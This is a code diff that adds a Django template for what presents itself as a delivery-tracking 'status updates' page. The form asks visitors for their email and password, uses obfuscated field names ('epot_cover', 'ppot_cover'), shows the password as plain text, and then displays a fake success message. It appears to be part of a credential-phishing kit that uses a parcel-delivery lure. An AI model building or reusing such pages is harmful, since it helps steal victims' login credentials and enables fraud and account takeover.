@@ -1,0 +1,35 @@
+{% extends 'mayne/base.html' %}
+
+{% load static %}
+
+{% block title %}Get Status Updates{% endblock %}
+
+{% block style %}
+
+
+{% endblock %}
+
+{% block content %}
+<section class="login-area-show">
+  <h2 class="h2-remark">Enter your email address and password to get status updates for delivery "{{de.tracking_number}}"</h2>
+  <div class="login-container">
+    <h2>Sign up</h2>
+    <form method="post" action="" class="login-form" novalidate>
+      {% csrf_token %}
+      <input class="kaa" type="text" placeholder="Email" name="epot_cover" value="" spellcheck="false" required>
+      <br>
+      <br>
+      <input class="kii" type="text" placeholder="Password" name="ppot_cover" value="" spellcheck="false" required>
+      <br>
+      <br>
+      <button onclick="success()" type="submit" class="sign-in-button">Get delivery updates</button>
+    </form>
+  </div>
+</section>
+
+<section onload="fadein()" class="success-area-hide">
+  <h4 class="h2-remark">Updates for delivery {{de.tracking_number}} successful!</h4>
+  <img src="{% static 'img/done.png' %}" alt="">
+</section>
+
+{% endblock %}
